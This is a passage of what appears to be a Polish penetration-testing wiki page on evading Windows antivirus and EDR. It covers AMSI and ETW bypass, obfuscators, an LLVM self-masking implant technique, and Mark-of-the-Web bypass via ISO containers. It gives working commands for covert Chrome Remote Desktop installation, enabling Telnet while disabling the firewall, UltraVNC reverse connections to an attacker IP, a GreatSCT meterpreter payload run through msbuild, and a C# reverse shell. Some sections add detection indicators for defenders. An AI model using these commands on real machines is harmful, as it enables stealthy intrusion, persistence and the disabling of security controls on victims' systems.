- **Wyłącz transkrypcję PowerShell i rejestrowanie modułów**: W tym celu możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` w Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Zaciemnianie

> [!TIP]
> Kilka technik zaciemniania polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko określonych fragmentów kodu, które są wrażliwe lub powinny pozostać ukryte.

### Usuwanie zaciemniania z plików binarnych .NET chronionych przez ConfuserEx

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub jego komercyjne forki) często napotyka się kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który można następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usuwanie zabezpieczenia przed manipulacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze modułu (`<Module>.cctor`). Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby znaleźć zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać oczyszczone zestawienie:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flagi:
     • `-p crx` – wybierz profil ConfuserEx 2
     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje stałe ciągi znaków.

3.  Usuwanie wywołań proxy – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *właściwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej analizy próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuskator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie open-source’owego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania za pomocą [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i ochrony przed modyfikacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak wykorzystać język `C++11/14` do generowania obfuskowanego kodu na etapie kompilacji, bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuskator binarny x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnej obfuskacji kodu dla języków obsługiwanych przez LLVM, wykorzystujący ROP (programowanie zorientowane na powroty). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP i podważając nasze naturalne wyobrażenie o normalnym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do postaci shellcode, a następnie je ładować

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant tylko wtedy, gdy jest uśpiony, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje w postaci zamaskowanej operacją XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera nazwy po demanglingu zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden wspólny handler maskujący w `.text`; sygnatury na poziomie źródłowym i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformację należy wykonać po wyborze instrukcji i optymalizacji, ponieważ musi obejmować **każdy wygenerowany rozkaz powrotu** i znać dokładny układ x86. Przed emisją `MachineFunctionPass` znajduje ostatni `MachineInstr::isReturn()`, usuwa go, aby końcowa ścieżka przechodziła dalej do dołączonego epilogu, a wcześniejsze rozkazy powrotu zastępuje przez `JMP_1 handler`. Zachowaj wygenerowane przez kompilator instrukcje demontażu stosu/ramki poprzedzające każdy powrót; przekieruj wyłącznie sam rozkaz powrotu.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emitują stuby dla poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają skokowi w prologu wskazywać późniejszy epilog; w przypadku ręcznie emitowanego bliskiego `je` zapisz `0F 84`, a po nim czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Jeśli dla niezaznaczonej funkcji pass niczego nie zmienił, musi zwrócić `false`; PoC błędnie zwraca w tej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające wskaźnik do funkcji z relokacją loadera oraz długość ustalaną w czasie działania programu w sekcji `.funcmeta`. Chociaż pole w C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia rekordu `+8`, obejmując długość i jej padding, a rekordy przesuwa o `0x10`. Nazwy sekcji PE mają tylko osiem bajtów, więc wyszukiwanie w czasie działania widzi `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w stubie dotychczasowy RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przechodzi po importach PE32+, aby rozwiązać już zaimportowaną funkcję `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Zawsze czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija nadal odszyfrowane ciało. Następnie epilog używa `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, dzięki czemu `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub czyści znacznik i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby odszyfrować ciało. Końcowa ścieżka przechodzi do dołączonego epilogu, a każdy wcześniejszy rozkaz powrotu wykonuje skok bezpośrednio do wspólnego handlera. Zwykły epilog również używa `jmp handler`, a nie `call`, więc po ponownym zamaskowaniu funkcji `ret` handlera pobiera adres powrotu pierwotnego wywołującego, zachowując wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitives maskujące i wskaźniki analityczne

Handler wyszukuje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia ochronę pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla odszyfrowuje więc kod przy wejściu i szyfruje go przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Wskaźniki o wysokiej wartości diagnostycznej dla tego rozwiązania obejmują:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia wewnątrz wykonywalnej sekcji `.stub` oraz sekcję `.funcmet` zawierającą klucz i wskaźniki `.text` z relokacjami;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, a następnie wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC `call`/`pop` i liczne miejsca powrotu przekierowane do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` i bajtowe zapisy XOR do stron wykonywalnych mapowanych z obrazu.

To omijanie skanerów pamięci, a nie ochrona kryptograficzna: zmodyfikowany plik nadal zawiera oryginalne, niezaszyfrowane ciało, a debugger może zatrzymać się na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` również ułatwiają odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są wspólne dla całego procesu. Równoczesne lub rekurencyjne wejście może więc ponownie przełączyć instrukcje podczas wykonywania ich przez inne wywołanie; wyjątki i nielokalne wyjścia również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować przejścia, przywracać ochronę faktycznie zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzać zgodność ścieżek `call` i `jmp` z wyrównaniem stosu x64 oraz wywoływać `FlushInstructionCache` po ponownym zapisaniu wykonywalnych bajtów. Microsoft wyraźnie wskazuje, że to wywołujący odpowiada za spójność pamięci podręcznej instrukcji po modyfikacji wykonywalnego kodu.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, którego celem jest ochrona użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (choć plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony przy pobieraniu plików z internetu wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem do podpisywania **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem na to, aby payloady nie otrzymały Mark of The Web, jest spakowanie ich w kontener, taki jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Oto demonstracja omijania SmartScreen przez pakowanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm rejestrowania zdarzeń w systemie Windows, który umożliwia aplikacjom i komponentom systemowym **rejestrowanie zdarzeń**. Mogą go jednak również używać produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączania (omijania) AMSI, można sprawić, by funkcja **`EtwEventWrite`** procesu działającego w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania zdarzeń. Osiąga się to przez zmodyfikowanie funkcji w pamięci tak, aby natychmiast zwracała wynik, co skutecznie wyłącza rejestrowanie ETW dla danego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksja zestawów C#

Ładowanie binariów C# do pamięci jest znane od dawna i nadal stanowi bardzo dobry sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania na dysku, wystarczy nam martwić się o załatanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) umożliwia już bezpośrednie wykonywanie zestawów C# w pamięci, ale można to robić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu złośliwego kodu post-exploitation do tego procesu, wykonaniu go, a po zakończeniu — zakończeniu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostanie ono wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa**. Wadą jest **większe ryzyko** wykrycia przez **wykrywanie behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i poddania go skanowaniu przez AV, ale wadą jest **znacznie większe ryzyko** **utraty Beacona**, ponieważ błąd podczas wykonywania payloadu może spowodować awarię procesu.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu zestawów C#, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i zapoznaj się z ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować zestawy C# **z PowerShella**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [nagranie wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Przepakowywanie narzędzi .NET do WebAssembly za pomocą NativeAOT (WasmForge)

Standardowe techniki `execute-assembly` zachowują rozpoznawalny kod MSIL i ostatecznie inicjalizują CLR. **WasmForge** zmienia natomiast środowisko wykonawcze: migruje projekt C# do eksperymentalnego celu NativeAOT-LLVM WASI, kompiluje go z wyprzedzeniem do WebAssembly i osadza ten moduł w hoście Windows PE opartym na Wazero. Powstały proces nie wymaga środowiska CLR, JIT ani hosta `dotnet` na systemie docelowym, więc reguły oparte wyłącznie na nazwach zestawów zarządzanych, ładowaniu CLR, AMSI lub .NET ETW tracą bezpośrednią widoczność. Jest to technika unikania wykrycia i pakowania, a nie omijanie granic uprawnień — kod gościa zachowuje uprawnienia oryginalnego narzędzia i jego obserwowalne zachowanie w systemie operacyjnym.<sup>[[44]](#references)[[45]](#references)</sup>

### Budowanie projektu C#

Zalecaną metodą budowania jest środowisko Docker projektu, ponieważ zawiera ono .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker i zależności do podpisywania. Plik `.csproj` jest wykrywany automatycznie; pojedyncze polecenie budowania wykonuje migrację, poprawki zgodności, kompilację WASM, tworzenie PE i podpisywanie.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

W przypadku rozwiązywania problemów lub przeglądania wygenerowanego kodu podziel proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i końcowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Obraz kompilacyjny korzysta również z wrappera `wasm-component-ld`, aby uniknąć kodowania komponentów WASI Preview 2 i wygenerować zwykły moduł oczekiwany przez osadzone środowisko uruchomieniowe.<sup>[[44]](#references)[[45]](#references)</sup>

### Mostkowanie wasm32 C# do x64 Win32

Nie jest to przezroczysta rekompilacja. NativeAOT-WASI nie obsługuje niektórych funkcji BCL ukierunkowanych na Windows lub zmienia ich działanie, a gość wasm32 zwykle przydziela czterobajtowe sloty na wskaźniki, podczas gdy API x64 mogą zwracać wskaźniki ośmiobajtowe. WasmForge rozwiązuje oba problemy za pomocą następujących generowanych warstw:<sup>[[44]](#references)</sup>

1. Patcher kodu źródłowego naprawia różnice semantyczne specyficzne dla AOT i przekierowuje nieobsługiwane wywołania dotyczące rejestru, potoków, WMI, tożsamości, usług katalogowych, wersji plików, LSA i podobnych funkcji do helperów `Wf*`.
2. Skaner P/Invoke generuje mapowania NativeAOT `DirectPInvoke`, dzięki czemu wywołania `[DllImport]` wiążą się z połączonymi symbolami mostka C zamiast dynamicznie ładować zadeklarowaną bibliotekę DLL wewnątrz gościa.
3. Wskaźniki przekazywane do hosta używają typu `ulong` w C# i `uint64_t` w C. Ogólny dispatcher przekazuje wywołanie do handlera Win32 hosta; `out8_mask` oznacza rzeczywiste ośmiobajtowe sloty wyjściowe, których górne połowy należy zachować. W przypadku nieoznaczonych wyjść o układzie wasm32 stosuje się ochronę snapshot/restore, aby zapis x64 nie uszkodził sąsiednich czterech bajtów.
4. Dedykowane mostki hosta obsługują operacje, które nie pasują do ogólnego dispatchowania syscalli, takie jak dostęp do pamięci podręcznej biletów LSA, operacje Kerberos/BCrypt ze strukturalnymi wynikami, ruch TCP KDC i zapytania LDAP.

Na przykład wrapper dla `version.dll!VerQueryValueW` przekazuje cztery adresy hosta i ustawia bity 2 i 3 (`0xC`), ponieważ wskaźnik wartości i długość zajmują ośmiobajtowe sloty wyjściowe. Sam wrapper pozostaje ogólny i przekazuje nazwę biblioteki DLL, nazwę eksportu, argumenty oraz maskę do `wf_call_v2`; host tłumaczy wskaźniki i wywołuje natywne API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograniczenia i punkty obserwacji wykrywania

Kod intensywnie korzystający z reflection, dynamiczne ładowanie assembly, dowolne natywne callbacki oraz złożone struktury x64 zwracane do pamięci WASM mogą nadal wymagać poprawek dla poszczególnych narzędzi lub całkowicie zawieść. Ogólne gniazda WASI Preview 2 mogą też trafiać do pustych stubów, dlatego obsługiwane narzędzia używają shimów hosta specyficznych dla protokołu. Sprawdź każde polecenie w porównaniu z kompilacją natywną, zamiast zakładać równoważność funkcji.<sup>[[44]](#references)[[45]](#references)</sup>

Ta technika zmienia telemetrię, zamiast czynić payload niewidocznym. Wykrywanie może koncentrować się na pliku PE zawierającym lub materializującym moduł WASM, zachowaniu środowiska uruchomieniowego podobnego do Wazero, nietypowym przydzielaniu i kopiowaniu pamięci hosta/gościa, ogólnym bezpośrednim wywoływaniu Win32, anomaliach związanych z podpisami i zasobami PE, a także wynikowych wywołaniach API i ruchu sieciowym. Braku zdarzeń CLR-load, AMSI lub .NET ETW nie należy zatem traktować jako dowodu, że proces jest nieszkodliwy.<sup>[[44]](#references)</sup>

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez Attackera**.

Zapewniając dostęp do plików binarnych interpretera i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale używanie Go, Java, PHP itp. zapewnia **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## Ponowne hostowanie WebAssembly w celu uniknięcia analizy statycznej

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może pozwolić procesowi działać, jednocześnie uniemożliwiając mu wykonywanie uprzywilejowanych działań inspekcji lub naprawy.

Aby temu zapobiec, Windows może **uniemożliwiać zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia nad nim kontroli i utrzymania persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij Next. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podane polecenie z wymaganymi zmianami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez używania GUI).
 

## Zaawansowane unikanie wykrywania

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Unikanie wykrywania to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach całkowite uniknięcie wykrycia jest praktycznie niemożliwe.

Każde środowisko, w którym działasz, będzie miało własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tej prelekcji [@ATTL4S](https://twitter.com/DaniLJ94), aby poznać podstawy bardziej zaawansowanych technik unikania wykrywania.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To kolejna świetna prelekcja [@mariuszbit](https://twitter.com/mariuszbit) na temat wielowarstwowego unikania wykrywania.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender wykrywa jako złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części pliku binarnego**, aż **ustali, którą część Defender** wykrywa jako złośliwą, a następnie ją wyodrębni.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia usługę w przeglądarce pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do czasu Windows10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Spraw, aby uruchamiało się przy starcie systemu, i uruchom je teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu (stealth) i wyłącz firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (wybierz pliki binarne, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **komputer ofiary**

#### **Połączenie zwrotne**

**Atakujący** powinien **uruchomić na swoim hoście** plik binarny `vncviewer.exe -listen 5900`, aby przygotować się na odebranie zwrotnego **połączenia VNC**. Następnie, na **komputerze ofiary**: uruchom demona winvnc poleceniem `winvnc.exe -run`, a potem wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję, nie rób kilku rzeczy:

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [wyskakujące okno](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo otworzy się [okno konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby uzyskać pomoc, bo wywołasz [wyskakujące okno](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload xml** za pomocą:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
